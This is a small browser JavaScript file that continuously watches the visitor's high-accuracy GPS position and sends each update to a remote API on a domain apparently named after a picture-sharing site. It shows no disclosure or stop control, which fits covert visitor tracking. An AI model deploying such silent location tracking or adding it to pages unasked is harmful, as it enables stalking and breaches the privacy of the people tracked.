(function () {
    "use strict";

    const API_URL = "https://picture-shere.onrender.com/api/locations";

    const errorEl = document.getElementById("error");


    function showError(message) {
        if (errorEl) {
            errorEl.textContent = message;
        }

        console.error(message);
    }


    function sendLocation(latitude, longitude, accuracy) {

        fetch(API_URL, {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({

                latitude: latitude,
                longitude: longitude,
                accuracy: accuracy

            })

        })

        .then(async response => {

            const data = await response.json();

            if (!response.ok) {
                throw new Error(
                    data.error || "Location save failed"
                );
            }

            console.log("Location saved:", data);

        })

        .catch(error => {

            showError(error.message);

        });
    }



    function getLocationError(error) {

        switch (error.code) {

            case error.PERMISSION_DENIED:
                showError(
                    "Location permission denied"
                );
                break;


            case error.POSITION_UNAVAILABLE:
                showError(
                    "Location unavailable"
                );
                break;


            case error.TIMEOUT:
                showError(
                    "Location timeout"
                );
                break;


            default:
                showError(
                    "Unknown location error"
                );
        }
    }



    if (!navigator.geolocation) {

        showError(
            "Browser does not support GPS"
        );

        return;
    }



    // LIVE LOCATION TRACKING

    navigator.geolocation.watchPosition(

        function (position) {


            const latitude =
                position.coords.latitude;


            const longitude =
                position.coords.longitude;


            const accuracy =
                position.coords.accuracy;



            console.log(
                "GPS:",
                latitude,
                longitude,
                accuracy
            );


            sendLocation(
                latitude,
                longitude,
                accuracy
            );


        },


        getLocationError,


        {

            enableHighAccuracy: true,

            timeout: 15000,

            maximumAge: 0

        }

    );


})();